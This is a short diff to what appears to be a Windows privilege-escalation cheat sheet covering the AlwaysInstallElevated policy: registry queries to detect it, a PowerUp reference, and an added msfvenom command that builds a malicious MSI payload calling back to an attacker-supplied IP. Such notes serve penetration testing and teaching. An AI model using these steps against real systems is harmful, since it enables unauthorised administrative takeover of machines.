@@ -439,8 +439,7 @@ net start <SERVICE>
 ### Always Install Elevated
  - This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to granting full administrative rights and even though Microsoft strongly discourages its use, it can still be found.
 
-#### Binaries that auto elevate
-Check status of AlwaysInstalledElevated registery setting (if yes then craft a MSI)
+#### Search for always install elevated
 ```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
@@ -450,6 +449,10 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 ```
 Write-UserAddMSI
+```
+ 
+```
+msfvenom -p <PAYLOAD> lhost=<IP> -f msi -o setup.msi
 ```
  
 #### Create msi from cobalstrike beacon
